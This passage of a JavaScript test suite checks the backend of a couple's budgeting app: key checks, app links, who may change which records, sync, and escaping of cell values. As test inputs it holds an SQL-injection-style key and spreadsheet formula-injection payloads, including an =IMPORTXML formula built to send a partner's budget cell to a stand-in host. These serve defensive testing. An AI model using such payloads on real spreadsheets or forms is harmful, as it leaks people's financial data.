    B.coming(db, "sophie", B.addDays(today, -14), 120).forEach(c2 => { const isPay = /payday/i.test(c2.name || "") || c2.table === "income"; if (!isPay && c2.table !== "bills") return; (out[c2.date] = out[c2.date] || []).push({name: isPay ? (c2.name || "Payday") : String(c2.name), sub: isPay ? (c2.amount ? c.calMoney_(c2.amount) : "") : c2.amount ? "Bill, £" + (Math.round(c2.amount * 100) / 100).toLocaleString("en-GB", {minimumFractionDigits: 0, maximumFractionDigits: 2}) : "Bill", pay: isPay, amount: c2.amount || 0}); }); return out; })()));
  ok("Caledonite: fun until payday", cs.fun && cs.fun.names.indexOf("Fun") >= 0 && typeof cs.fun.left === "number" && /^\d{4}-\d{2}-\d{2}$/.test(cs.fun.until), cs.fun);
  ok("Caledonite: a Budgie key can ask for its own calendar too", call({key: kE, action: "app.calendar"}).person === "ethan");
  ok("calendar money looks like Caledonite's", c.calMoney_(1100) === "£1,100" && c.calMoney_(8.5) === "£8.5" && c.calMoney_(12.05) === "£12.05" && c.calMoney_(0.84) === "£0.84");

  // S7: a key that isn't the right shape is turned away before the properties are read
  const gp = c.PropertiesService.getScriptProperties; let reads = 0;
  c.PropertiesService.getScriptProperties = () => { const p = gp(); const all = p.getProperties; p.getProperties = () => { reads++; return all(); }; return p; };
  ["nope", "x".repeat(64), "A".repeat(64), "app_peckish_" + "z".repeat(64), "' OR 1=1"].forEach(k => call({key: k, action: "ping"}));
  ok("S7: malformed keys don't read the properties", reads === 0, reads);
  call({key: kS, action: "ping"}); const r1 = reads; call({key: kS, action: "ping"}); call({key: kS, action: "ping"});
  ok("S7: a good key is looked up once, then cached for 10 minutes", r1 <= 1 && reads === r1, {r1, reads});
  const wrong = "0".repeat(64); call({key: wrong, action: "ping"}); const r2 = reads; call({key: wrong, action: "ping"});
  ok("S7: a well-formed wrong key is remembered too", reads === r2 && call({key: wrong, action: "ping"}).ok === false);
  for (let i = 0; i < 50; i++) call({key: require("crypto").randomBytes(32).toString("hex"), action: "ping"});
  ok("S7: a flood of made-up keys reads the properties at most once", reads - r2 <= 1, reads - r2);
  c.PropertiesService.getScriptProperties = gp;
  const pkS = JSON.parse(Buffer.from(c.appLink("sophie", "peckish").split("#connect=")[1], "base64url").toString()).k, pkE = env.props.APPKEY_ethan_peckish;
  ok("S7: a brand new link works straight away", call({key: pkS, action: "ping"}).ok === true);
  const oldS = env.props.KEY_sophie; c.newKey("sophie");
  ok("S7: a changed key stops working at once", call({key: oldS, action: "ping"}).ok === false && call({key: env.props.KEY_sophie, action: "ping"}).person === "sophie");
  // a new Budgie key (a lost phone) also cuts off that person's linked apps, and nobody else's
  ok("newKey(person) unlinks that person's apps at once", call({key: cal, action: "app.calendar"}).ok === false && call({key: pkS, action: "ping"}).ok === false && !env.props.APPKEY_sophie_caledonite && !env.props.APPKEY_sophie_peckish);
  ok("newKey(person) leaves the partner's links alone", call({key: pkE, action: "ping"}).ok === true);
  delete env.props.APPKEY_ethan_peckish;
  ok("S7: a key deleted by hand stops at once, even while the list is cached", call({key: pkE, action: "ping"}).ok === false);
}
// linking apps from the app itself (a person's own full key), and keyType
{
  const F = fresh(), {call, kE, kS, env} = F;
  ok("keyType full on every sync", call({key: kE}).keyType === "full" && call({key: kE, full: true}).keyType === "full" && call({key: kE, action: "ping"}).keyType === "full");
  ok("app.status: nothing linked yet", JSON.stringify(call({key: kE, action: "app.status"}).apps) === JSON.stringify({peckish: false, caledonite: false}));
  const l1 = call({key: kE, action: "app.link", app: "peckish"});
  const k1 = l1.ok && JSON.parse(Buffer.from(l1.link.split("#connect=")[1], "base64url").toString());
  ok("app.link: a normal connect link for the app", l1.ok && /^https:\/\/alertrobot\.github\.io\/es-kitchen\/#connect=/.test(l1.link) && k1.u === "https://script.google.com/macros/s/TEST/exec" && /^app_peckish_[0-9a-f]{64}$/.test(k1.k) && env.props.APPKEY_ethan_peckish === k1.k, l1);
  ok("app.link: the new key works, as an app key", JSON.stringify(call({key: k1.k, action: "ping"})) === JSON.stringify({ok: true, person: "ethan", app: "peckish", keyType: "app"}));
  const l2 = call({key: kE, action: "app.link", app: "peckish"}), k2 = JSON.parse(Buffer.from(l2.link.split("#connect=")[1], "base64url").toString()).k;
  ok("app.link again: a new key, and the old copy is cut off", k2 !== k1.k && call({key: k1.k, action: "ping"}).ok === false && call({key: k2, action: "ping"}).ok === true);
  ok("app.status shows it", JSON.stringify(call({key: kE, action: "app.status"}).apps) === JSON.stringify({peckish: true, caledonite: false}) && call({key: kS, action: "app.status"}).apps.peckish === false);
  ok("an app key can't link, unlink or list apps", ["app.link", "app.unlink", "app.status"].every(a => call({key: k2, action: a, app: "caledonite"}).error === "That's not allowed with this link"));
  ok("an app key can't do anything it isn't for", call({key: k2, action: "whatever"}).error === "That's not allowed with this link");
  ok("app.link: unknown app refused", call({key: kE, action: "app.link", app: "evil"}).ok === false);
  ok("app.unlink: the key is gone", call({key: kE, action: "app.unlink", app: "peckish"}).ok && !env.props.APPKEY_ethan_peckish && call({key: k2, action: "ping"}).ok === false && call({key: kE, action: "app.status"}).apps.peckish === false);
  ok("Sophie's link is her own", (call({key: kS, action: "app.link", app: "caledonite"}), call({key: kS, action: "app.status"}).apps.caledonite === true && call({key: kE, action: "app.status"}).apps.caledonite === false));
}
// S4: ids that belong to someone else
{
  const F = fresh(t => { t.bills.push({id: "e", person: "sophie", name: "Odd", amount: 1, account: "s-main", unit: "once", start: "2026-12-01"}); });
  const {call, kE, kS} = F;
  const r = call({key: kS, ops: [
    {op: "put", table: "settings", row: {id: "ethan:share.totals", person: "sophie", key: "share.totals", value: "false"}},
    {op: "put", table: "settings", row: {id: "ethan:share.totals", person: "ethan", key: "share.totals", value: "false"}},
    {op: "put", table: "settings", row: {person: "sophie", key: "share.cats", value: "false"}},
    {op: "put", table: "exceptions", row: {id: "x-e-pay-2026-10-29-amount", item: "e", date: "2026-10-29", action: "amount", amount: 1}},
    {op: "put", table: "exceptions", row: {id: "x-e-pay-2026-10-29-amount", item: "e-pay", date: "2026-10-29", action: "amount", amount: 1}},
    {op: "put", table: "exceptions", row: {id: "x-s-pay-2026-11-27-amount", item: "s-pay", date: "2026-11-27", action: "amount", amount: 1}},
    {op: "put", table: "exceptions", row: {id: "something", item: "s-pay", date: "2026-11-27", action: "amount", amount: 1}}
  ]});
  ok("S4: Sophie can't squat Ethan's setting or exception ids", r.rejected.map(x => x.i).join() === "0,1,3,4,6" && r.applied.map(x => x.id).join() === "sophie:share.cats,x-s-pay-2026-11-27-amount", r);
  ok("S4: Ethan's setting is still free", call({key: kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.totals", person: "ethan", key: "share.totals", value: "true"}}]}).applied.length === 1);
  ok("S4: a setting's key can't be changed under its id", call({key: kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.totals", key: "share.payments"}}]}).rejected.length === 1);
}
// S10: what reaches a cell
{
  const F = fresh(), c = F.c;
  const cases = {"=1+1": "'=1+1", " =HYPERLINK(\"x\")": "' =HYPERLINK(\"x\")", "\t+SUM(A1)": "'\t+SUM(A1)", "​@x": "'​@x", "-x": "'-x", "'kept": "''kept", "+44 7700 900000": "'+44 7700 900000",
    "-20": "-20", "12.50": "12.50", "2026-10-28": "2026-10-28", "e-food-b": "e-food-b", "Tesco": "Tesco", "pay:2026-10-29:e-lisa": "pay:2026-10-29:e-lisa"};
  const bad = Object.keys(cases).filter(k => c.cell_(k) !== cases[k]).map(k => [k, c.cell_(k)]);
  ok("S10: formulas and apostrophes kept as text; numbers, dates and ids as they are", !bad.length && c.cell_(5) === 5 && c.cell_(true) === true && c.cell_(null) === "", bad);
  F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-f1", date: "2026-10-28", person: "ethan", amount: 1, budget: "e-fun", note: " =IMPORTDATA(\"https://x\")"}}, {op: "put", table: "transactions", row: {id: "t-f2", date: "2026-10-28", person: "ethan", amount: 1, budget: "e-fun", note: "'quoted'"}}]});
  F.c.CACHE_ = {}; const rows = F.c.readTable_("transactions").rows;
  ok("S10: and read back as typed", rows.find(r => r.id === "t-f1").note === " =IMPORTDATA(\"https://x\")" && rows.find(r => r.id === "t-f2").note === "'quoted'");
}

// R4: a joint goal made just one person's, and a balance moved off a LISA, leave the other phone
{
  const B = require("../engine.js");
  const F = fresh(t => t.valuations.push({id: "v-l2", account: "e-lisa", date: "2026-10-27", amount: 10100}));
  const S = phone(F, F.kS); S.sync();
  ok("R4: Sophie has the joint goal and Ethan's LISA balance", B.load(S.T).goals.some(g => g.id === "house") && B.load(S.T).valuations.some(v => v.id === "v-l2"));
  wait(5100);
  const r = F.call({key: F.kE, ops: [{op: "put", table: "goals", row: {id: "house", owners: "ethan"}}, {op: "put", table: "valuations", row: {id: "v-l2", account: "e-isa"}}]});
  ok("R4: Ethan's changes saved", r.applied.length === 2, r);
  const j = S.sync();
  ok("R4: Sophie's next sync is only changes", j.ok && !j.full, j);
  ok("R4: the goal has gone from her phone", !B.load(S.T).goals.some(g => g.id === "house"), S.T.goals);
  ok("R4: and so has the balance", !B.load(S.T).valuations.some(v => v.id === "v-l2"), S.T.valuations);
  ok("R4: Ethan still has both", (() => { const E = phone(F, F.kE); E.sync(); return B.load(E.T).goals.some(g => g.id === "house") && B.load(E.T).valuations.some(v => v.id === "v-l2"); })());
}

// R5: a regular payment is the payer's to change: the one it's paid to can't change, skip or stop it
{
  const F = fresh();
  const r = F.call({key: F.kE, ops: [
    {op: "put", table: "transfers", row: {id: "s-to-e-rent", amount: 900}},
    {op: "put", table: "exceptions", row: {id: "x-s-to-e-rent-2026-11-13-skip", item: "s-to-e-rent", date: "2026-11-13", action: "skip"}},
    {op: "put", table: "amounts", row: {id: "amt-e1", item: "s-to-e-rent", start: "2026-12-01", amount: 1}},
    {op: "put", table: "transfers", row: {id: "e-new", from: "sophie", to: "ethan", name: "Made up", amount: 50, unit: "month", on: "1", start: "2026-11-01"}},
    {op: "delete", table: "transfers", id: "s-to-e-bills"}]});
  ok("R5: Ethan can't change Sophie's payments to him", r.rejected.length === 5 && !r.applied.length, r);
  F.c.CACHE_ = {};
  ok("R5: and they're as they were", F.c.readTable_("transfers").rows.find(x => x.id === "s-to-e-rent").amount === 500 && !F.c.readTable_("transfers").rows.some(x => x.id === "e-new") && !F.c.readTable_("exceptions").rows.some(x => x.item === "s-to-e-rent"));
  const s = F.call({key: F.kS, ops: [{op: "put", table: "transfers", row: {id: "s-to-e-rent", amount: 520}}, {op: "put", table: "exceptions", row: {id: "x-s-to-e-rent-2026-11-13-skip", item: "s-to-e-rent", date: "2026-11-13", action: "skip"}}]});
  ok("R5: Sophie can", s.applied.length === 2 && !s.rejected.length, s);
}

// R7: a name that looks like a formula reaches the budget tabs as text
{
  const F = fresh();
  F.call({key: F.kS, ops: [{op: "put", table: "bills", row: {id: "s-evil", person: "sophie", name: "=IMPORTXML(\"https://x.example/?\"&'Ethan budget'!B5,\"//a\")", amount: 1, account: "s-main", unit: "month", on: "3", start: "2026-11-01"}}]});
  F.c.refreshBudgetTabs();
  const sh = F.env.sheets["Sophie budget"], raw = [], gr = sh.getRange;
  sh.getRange = (...a) => { const g = gr(...a), sv = g.setValues; g.setValues = (v) => { raw.push(...v); return sv(v); }; return g; };
  F.c.refreshBudgetTabs();
  const cellsWith = raw.flat().filter(v => typeof v === "string" && /IMPORTXML/.test(v));
  ok("R7: the formula-looking bill name is written as text", cellsWith.length > 0 && cellsWith.every(v => v.charAt(0) === "'"), cellsWith);
  ok("R7: numbers stay numbers", raw.flat().some(v => typeof v === "number"));
}

// R8: a split taken off by typing in the sheet leaves the partner's phone too
{
  const B = require("../engine.js");
  const F = fresh(t => t.transactions.push({id: "sx2", date: "2026-10-27", person: "sophie", amount: 60, budget: "s-food", account: "s-main", split: "half"}));
  const E = phone(F, F.kE); E.sync();
  ok("R8: Ethan has Sophie's split shop", B.load(E.T).transactions.some(x => x.id === "sx2"));
  wait(5100);
  const sh = F.env.sheets.transactions, head = sh._s.cells[0], ri = sh._s.cells.findIndex(x => x[0] === "sx2");
  sh._s.cells[ri][head.indexOf("split")] = "";
  F.c.CACHE_ = {}; F.c.onEdit({range: {getSheet: () => sh, getRow: () => ri + 1, getLastRow: () => ri + 1, getColumn: () => head.indexOf("split") + 1, getLastColumn: () => head.indexOf("split") + 1}});
  wait(5100); const j = E.sync();
  ok("R8: his next sync fetches everything once", j.ok && j.full === true, j.full);
  ok("R8: and the now-private shop has gone", !B.load(E.T).transactions.some(x => x.id === "sx2"));
  ok("R8: after that, only changes again", E.sync().full === false);
}

// R9: a change the sheet couldn't save for a passing reason (a Google hiccup) comes back to be sent again, and so
// does everything after it in the batch (untried), so changes keep their order; a refusal is final
{
  const F = fresh(), sh = F.env.sheets.transactions, real = sh.appendRow; let once = true;
  sh.appendRow = (row) => { if (once) { once = false; throw new Error("Service Spreadsheets timed out while accessing document"); } return real(row); };
  const j = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-notmine", date: "2026-10-28", person: "sophie", amount: 3, budget: "s-food"}},
    {op: "put", table: "transactions", row: {id: "t-hiccup", date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun"}},
    {op: "put", table: "transactions", row: {id: "t-hiccup", amount: 4}}]});
  const r = j.rejected || [];
  ok("R9: a refusal is final", r[0] && r[0].i === 0 && r[0].retry === false, r);
  ok("R9: a hiccup is sent back to try again", r[1] && r[1].i === 1 && r[1].retry === true && !r[1].notTried, r);
  ok("R9: and what came after it isn't tried yet, so it can't be undone by the retry", r[2] && r[2].i === 2 && r[2].retry === true && r[2].notTried === true && !F.c.readTable_("transactions").rows.some(x => x.id === "t-hiccup"), r);
  const j2 = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-hiccup", date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun"}}, {op: "put", table: "transactions", row: {id: "t-hiccup", amount: 4}}]});
  F.c.CACHE_ = {};
  ok("R9: sent again, both are saved, in order", j2.applied.length === 2 && +F.c.readTable_("transactions").rows.find(x => x.id === "t-hiccup").amount === 4, j2);
}

// R10: a phone that hasn't synced for longer than the list of rows to drop is kept fetches everything
{
  const F = fresh(t => {
    t.transactions.push({id: "sx-old", date: "2026-08-01", person: "sophie", amount: 30, budget: "s-food", account: "s-main"});
    t.transactions.push({id: "sx-new", date: "2026-10-27", person: "sophie", amount: 20, budget: "s-food", account: "s-main", split: "half"});
  });
  const now = Date.now(), old = now - 61 * 86400000;
  // sx-old was split until 61 days ago, when Sophie made it private; Ethan's phone last synced the day before that
  F.env.props.HIDDEN_ROWS = JSON.stringify([{t: "transactions", i: "sx-old", q: "ethan", a: old}]);
  F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "sx-new", split: ""}}]});
  const j = F.call({key: F.kE, since: old - 86400000});
  ok("R10: the old phone fetches everything, so the row made private goes", j.ok && j.full === true && !j.rows.transactions.some(x => x.id === "sx-old"), {full: j.full});
}

// R11: refreshing the budget tabs keeps one warning on each, not one more every time
{
  const F = fresh();
  for (let i = 0; i < 3; i++) F.c.refreshBudgetTabs();
  const tab = F.env.sheets["Ethan budget"];
  ok("R11: one protection on the budget tab after three refreshes", tab && tab._s.protections.length === 1, tab && tab._s.protections.length);
}

// T1 (1.4.18): the budget tab reads like the Money tab: its sections, money set aside for a yearly bill under bills, a
// top-up in what's saved and what's left over, for both of you and every month column
{
  const B = require("../engine.js");
  const F = fresh(t => t.transactions.push({id: "t-over", date: "2026-11-10", person: "ethan", amount: 300, budget: "e-fun", account: "e-main"}));
  const real = F.c.Utilities.formatDate; F.c.Utilities.formatDate = (d, tz, f) => f === "yyyy-MM-dd" ? "2026-12-05" : real(d, tz, f);
  F.c.refreshBudgetTabs(); F.c.Utilities.formatDate = real;
  const db = B.load(F.c.allTables_(), "2026-12-05");
  ["ethan", "sophie"].forEach(p => {
    const cells = F.env.sheets[db.byId[p].name + " budget"]._s.cells, col0 = cells.map(r => r[0]), at = x => col0.indexOf(x);
    const per = [B.periodAt(db, p, "2026-12-05")]; for (let i = 0; i < 5; i++) per.push(B.nextPeriod(db, p, per[i]));
    const kt = per.map(pk => B.kinds(B.planFor(db, p, pk).lines));
    // (a kind with nothing in any of the six months, like Sophie's saving here, has no section)
    const has = ["in", "bill", "spend", "save"].map(k => per.some(pk => B.planFor(db, p, pk).lines.some(l => B.kindOf(l) === k)));
    const heads = ["Coming in", "Bills to pay", "What you can spend", "What's saved"].filter((x, i) => has[i]);
    ok("T1 " + p + ": the Money tab's sections, in its order", heads.length >= 3 && heads.map(at).every((v, i, a) => v > 0 && (!i || v > a[i - 1])) && ["Coming in", "Bills to pay", "What you can spend", "What's saved"].filter((x, i) => !has[i]).every(x => at(x) < 0), col0);
    ok("T1 " + p + ": no old sections or Top-ups", !["Money in", "Bills", "Spending", "Savings", "Top-ups"].some(x => col0.includes(x)) && !col0.some(x => /^Total /.test(x)), col0);
    const row = x => cells[at(x)].slice(1);
    ok("T1 " + p + ": each heading has its total for every month", ["in", "bill", "spend", "save"].every((k, i) => !has[i] || JSON.stringify(row(["Coming in", "Bills to pay", "What you can spend", "What's saved"][i])) === JSON.stringify(kt.map(t => t[k]))), kt);
    ok("T1 " + p + ": left over for every month, and it adds up", JSON.stringify(row("Left over")) === JSON.stringify(kt.map(t => Math.max(0, t.left))) && row("Left over").length === 6, row("Left over"));
    const setAside = col0.filter(x => /^Set aside for /.test(x));
    ok("T1 " + p + ": set aside for a yearly bill is under bills", setAside.every(x => at(x) > at("Bills to pay") && at(x) < at("What you can spend")), {setAside, col0});
    if (p === "sophie") ok("T1 sophie: her membership is set aside for", setAside.includes("Set aside for Membership"), col0);
    const top = col0.filter(x => /^Top up /.test(x));
    ok("T1 " + p + ": a top-up is in what's saved", top.every(x => at("What's saved") > 0 && at(x) > at("What's saved") && at(x) < at("Left over")), {top, col0});
    if (p === "ethan") ok("T1 ethan: the Emergency pot's top-up (he went over Fun in November) is saved", top.includes("Top up Emergency pot"), col0);
  });
}

// R12: text the sheet would turn into a date, time or number is kept as typed; a list is written as text
{
  const F = fresh(), c = F.c;
  const cases = {"1/2": "'1/2", "£12": "'£12", "50%": "'50%", "2:30": "'2:30", "5 Nov": "'5 Nov", "Thu 29 Oct": "'Thu 29 Oct", "1,234": "'1,234",
    "2026-10-28": "2026-10-28", "12.50": "12.50", "Tesco": "Tesco", "24/7 Store": "24/7 Store", "ethan:2, sophie:1": "ethan:2, sophie:1", "x-e-pay-2026-10-29-amount": "x-e-pay-2026-10-29-amount"};
  const bad = Object.keys(cases).filter(k => c.cell_(k) !== cases[k]).map(k => [k, c.cell_(k)]);
  ok("R12: text stays text", !bad.length, bad);
  const numLike = {"007": "'007", "1e5": "'1e5", "+5": "'+5", ".5": "'.5", "00": "'00", "-0012": "'-0012", "0.5": "0.5", "0": "0", "-3.25": "-3.25", "120": "120"};
  const badN = Object.keys(numLike).filter(k => c.cell_(k) !== numLike[k]).map(k => [k, c.cell_(k)]);
  ok("R12: text the sheet would read as a different number (007, 1e5) is kept as typed; plain numbers stay numbers", !badN.length, badN);
  ok("R12: a list or object is written as text, never as a formula", c.cell_(["=IMPORTDATA(1)"]) === '["=IMPORTDATA(1)"]' && typeof c.cell_({a: 1}) === "string" && c.cell_(new Date(0)) instanceof Date);
  F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-note", date: "2026-10-28", person: "ethan", amount: 2, budget: "e-fun", note: "1/2"}}]});
  F.c.CACHE_ = {};
  ok("R12: and comes back as typed", F.c.readTable_("transactions").rows.find(x => x.id === "t-note").note === "1/2");
}

// R13: Caledonite only calls income a payday (a bill called "Payday loan" is a bill)
{
  const F = fresh(t => t.bills.push({id: "e-pdl", person: "ethan", name: "Payday loan", amount: 50, account: "e-main", unit: "month", on: "3", start: "2026-11-01"}));
  const j = F.call({key: F.kE, action: "app.calendar"}), all = [].concat(...Object.values(j.days || {}));
  const pdl = all.filter(x => x.name === "Payday loan");
  ok("R13: the bill is shown as a bill", pdl.length > 0 && pdl.every(x => !x.pay && /^Bill/.test(x.sub)), pdl);
}

// R14: a payment comes out of your own account, and a pot move is between your own accounts
{
  const F = fresh(t => t.transactions.push({id: "t-legacy", date: "2026-10-27", person: "ethan", amount: 5, budget: "e-fun", account: "s-main"}));
  const tx = (id, account) => ({op: "put", table: "transactions", row: {id, date: "2026-10-28", person: "ethan", amount: 4, budget: "e-fun", account}});
  const mv = (id, from, to) => ({op: "put", table: "moves", row: {id, date: "2026-10-28", person: "ethan", from, to, amount: 10, key: "k:" + id}});
  const j = F.call({key: F.kE, ops: [tx("t-own", "e-food"), tx("t-blank", ""), tx("t-hers", "s-main"), tx("t-nowhere", "x-made-up"),
    mv("m-own", "e-main", "e-lisa"), mv("m-to-hers", "e-main", "s-savings"), mv("m-from-hers", "s-main", "e-main"), mv("m-warn", "", "")]});
  const rej = (j.rejected || []).map(r => r.id), app = (j.applied || []).map(r => r.id);
  ok("R14: own accounts and blanks are saved", ["t-own", "t-blank", "m-own", "m-warn"].every(x => app.indexOf(x) >= 0), j.applied);
  ok("R14: the partner's (or a made-up) account is turned down, for good", ["t-hers", "t-nowhere", "m-to-hers", "m-from-hers"].every(x => rej.indexOf(x) >= 0) && j.rejected.every(r => r.retry === false), j.rejected);
  const k = F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-own", account: "s-rent"}}, {op: "delete", table: "transactions", id: "t-legacy"}]});
  ok("R14: an existing payment can't be moved onto the partner's account", k.rejected.length === 1 && k.rejected[0].id === "t-own", k.rejected);
  ok("R14: an old payment on the wrong account can still be taken off", k.applied.some(r => r.id === "t-legacy"), k.applied);
  // Sophie: her own accounts are fine, Ethan's aren't
  const s = F.call({key: F.kS, ops: [{op: "put", table: "moves", row: {id: "m-s", date: "2026-10-28", person: "sophie", from: "s-main", to: "s-savings", amount: 5, key: "k:s"}},
    {op: "put", table: "moves", row: {id: "m-s2", date: "2026-10-28", person: "sophie", from: "s-main", to: "e-lisa", amount: 5, key: "k:s2"}}]});
  ok("R14: the same for Sophie", s.applied.some(r => r.id === "m-s") && s.rejected.length === 1 && s.rejected[0].id === "m-s2", s);
  // the bank feed's own writes aren't held to it
  F.c.CACHE_ = {}; F.c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "bk-x", date: "2026-10-28", person: "ethan", amount: 1, account: "e-main"}}, Date.now(), "bank", {sys: true});
  ok("R14: the bank feed still writes", F.c.readTable_("transactions").rows.some(x => x.id === "bk-x"));
}

// R15 a yearly bill with "put a bit by" turned off keeps that choice in the sheet (it used to be dropped)
{
  const F = fresh();
  F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-ins", person: "ethan", name: "Car insurance", amount: 600, account: "e-car", unit: "year", start: "2027-03-01", setAside: false}}]});
  const back = F.call({key: F.kE, full: true}).rows.bills.find(b => b.id === "e-ins") || {};
  ok("R15: setAside off is saved in the sheet", back.setAside === false || /^false$/i.test(String(back.setAside)), back);
  ok("R15: and the engine reads it back as off", B.load({bills: [back]}).bills[0].setAside === false, back);
}

// R16 everything that names an account uses the account of the person on that side (not just payments and moves),
// so a partner's phone can't take money out of the other's pots on paper
{
  const F = fresh();
  const tr = (id, fromAccount, toAccount) => ({op: "put", table: "transfers", row: {id, from: "sophie", to: "ethan", name: "Share", amount: 40, fromAccount, toAccount, unit: "month", on: "1", start: "2026-11-01"}});
  const s = F.call({key: F.kS, ops: [tr("tr-ok", "s-rent", "e-bills"), tr("tr-blank", "", ""), tr("tr-from-his", "e-emergency", "e-bills"), tr("tr-to-hers", "s-rent", "s-main"),
    {op: "put", table: "bills", row: {id: "s-bill-his", person: "sophie", name: "Gym2", amount: 30, account: "e-main", unit: "month", on: "2", start: "2026-11-01", split: "half"}},
    {op: "put", table: "income", row: {id: "s-inc-his", person: "sophie", name: "Gift", amount: 30, account: "e-lisa", unit: "once", start: "2026-11-02"}},
    {op: "put", table: "budgets", row: {id: "s-bud-his", person: "sophie", name: "Fuel", amount: 30, mode: "daily", account: "e-car"}},
    {op: "put", table: "settlements", row: {id: "st-ok", date: "2026-10-28", from: "sophie", to: "ethan", amount: 5, fromAccount: "s-main", toAccount: "e-main"}},
    {op: "put", table: "loans", row: {id: "ln-ok", lender: "sophie", borrower: "ethan", name: "Tickets", amount: 50, date: "2026-10-28", account: "s-main"}},
    {op: "put", table: "loans", row: {id: "ln-borrower", lender: "ethan", borrower: "sophie", name: "Bike", amount: 50, date: "2026-10-28", account: "s-main"}}]});
  const app = (s.applied || []).map(r => r.id), rej = (s.rejected || []).map(r => r.id);
  ok("R16: the right people's accounts (and blanks) are saved", ["tr-ok", "tr-blank", "st-ok", "ln-ok"].every(x => app.indexOf(x) >= 0), s.applied);
  ok("R16: the other person's accounts are turned down, for good", ["tr-from-his", "tr-to-hers", "s-bill-his", "s-inc-his", "s-bud-his", "ln-borrower"].every(x => rej.indexOf(x) >= 0) && s.rejected.every(r => r.retry === false), s.rejected);
  const e = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "st-hers", date: "2026-10-28", from: "sophie", to: "ethan", amount: 50, fromAccount: "s-savings", toAccount: "e-main"}},
    {op: "put", table: "settlements", row: {id: "st-mine", date: "2026-10-28", from: "sophie", to: "ethan", amount: 50, toAccount: "e-main"}}]});
  ok("R16: Ethan can't log a payment out of Sophie's savings, only into his own", e.rejected.length === 1 && e.rejected[0].id === "st-hers" && /Sophie/.test(e.rejected[0].error) && e.applied.some(r => r.id === "st-mine"), e);
  const l = F.call({key: F.kE, ops: [{op: "put", table: "loans", row: {id: "ln-e", lender: "ethan", borrower: "sophie", name: "Bike", amount: 80, date: "2026-10-28", account: "e-main"}},
    {op: "put", table: "loans", row: {id: "ln-s", lender: "sophie", borrower: "ethan", name: "Coat", amount: 80, date: "2026-10-28", account: "s-savings"}}]});
  ok("R16: a loan is paid from the lender's account, and only the lender says which", l.applied.some(r => r.id === "ln-e") && l.rejected.length === 1 && l.rejected[0].id === "ln-s", l);
  const l2 = F.call({key: F.kS, ops: [{op: "put", table: "loans", row: {id: "ln-e", lender: "ethan", borrower: "sophie", name: "Bike (red)", amount: 80, date: "2026-10-28", account: "e-main"}}]});
  ok("R16: the borrower can still change the rest of a loan that names the lender's account", l2.applied.length === 1, l2);
}

// R17 a private bill that becomes shared brings its price change and its skipped month to the partner's phone
// on an ordinary sync, so both phones work out what's owed the same
{
  const F = fresh(), real = Date.now; let T = real(); Date.now = () => T;
  try {
    F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-bb", person: "ethan", name: "Broadband", amount: 30, account: "e-bills", unit: "month", on: "3", start: "2026-11-01"}},
      {op: "put", table: "amounts", row: {id: "amt-bb", item: "e-bb", start: "2026-12-01", amount: 45}}, {op: "put", table: "exceptions", row: {id: "x-e-bb-2027-01-03-skip", item: "e-bb", date: "2027-01-03", action: "skip"}}]});
    T += 60000; const S = phone(F, F.kS); S.sync();
    ok("R17: (Sophie can't see the private bill or its changes)", !S.T.bills.some(b => b.id === "e-bb") && !S.T.amounts.some(a => a.id === "amt-bb"));
    T += 60000; F.call({key: F.kE, ops: [{op: "put", table: "bills", row: {id: "e-bb", person: "ethan", name: "Broadband", amount: 30, account: "e-bills", unit: "month", on: "3", start: "2026-11-01", split: "half"}}]});
    T += 60000; const j = S.sync();
    ok("R17: once it's shared, its price change and skip arrive with it", !j.full && S.T.bills.some(b => b.id === "e-bb") && S.T.amounts.some(a => a.id === "amt-bb") && S.T.exceptions.some(x => x.id === "x-e-bb-2027-01-03-skip"), {full: j.full, a: j.rows.amounts, x: j.rows.exceptions});
    const E = phone(F, F.kE); E.sync();
    const owed = (P, p) => { const d = B.load(P.T, "2027-02-10"); return B.between(d, p, "2027-02-10").net; };
    ok("R17: and both phones agree on what's owed", Math.abs(owed(E, "ethan") + owed(S, "sophie")) < 0.005, [owed(E, "ethan"), owed(S, "sophie")]);
  } finally { Date.now = real; }
}

// R18 text too long for a cell is turned down for good, so it doesn't hold up the changes after it
{
  const F = fresh(), tx = (id, note) => ({op: "put", table: "transactions", row: {id, date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun", account: "e-main", note}});
  const j = F.call({key: F.kE, ops: [tx("t-long", "x".repeat(60000)), tx("t-after", "fine")]});
  ok("R18: a 60,000-character note is turned down, not retried", j.rejected.length === 1 && j.rejected[0].id === "t-long" && j.rejected[0].retry === false, j.rejected);
  ok("R18: and the next change is still saved", j.applied.some(r => r.id === "t-after"), j.applied);
}

// R19 (1.4.4) you both tick the same settling up before your phones catch up: it only counts once,
// but settling up again later for something new still counts
{
  const F = fresh(), d = "2026-10-28", B = F.c.Budgie;
  const pay = (id, amt) => ({op: "put", table: "transactions", row: {id, date: d, person: "ethan", amount: amt, budget: "e-fun", account: "e-main", split: "half"}});
  const settle = (id, amt) => ({op: "put", table: "settlements", row: {id, date: d, from: "sophie", to: "ethan", amount: amt, key: "split:" + d, note: "Settled up"}});
  F.call({key: F.kE, ops: [pay("t-lunch", 40)]});
  F.call({key: F.kS, ops: [settle("set-s", 20)]});   // Sophie: "I've paid"
  F.call({key: F.kE, ops: [settle("set-e", 20)]});   // Ethan, before his phone heard: "it's arrived"
  const owed = () => { F.c.CACHE_ = {}; return B.between(B.load(F.c.allTables_(), d), "ethan", d).net; };
  const rows = () => { F.c.CACHE_ = {}; return F.c.readTable_("settlements").rows; };
  ok("R19: the second tick is kept, marked as a copy", (rows().find(r => r.id === "set-e") || {}).deleted === true && /Same settling up as set-s/.test((rows().find(r => r.id === "set-e") || {}).note), rows().find(r => r.id === "set-e"));
  ok("R19: so they're all square, not owing it back", Math.abs(owed()) < 0.005, owed());
  F.call({key: F.kE, ops: [pay("t-dinner", 40)]});
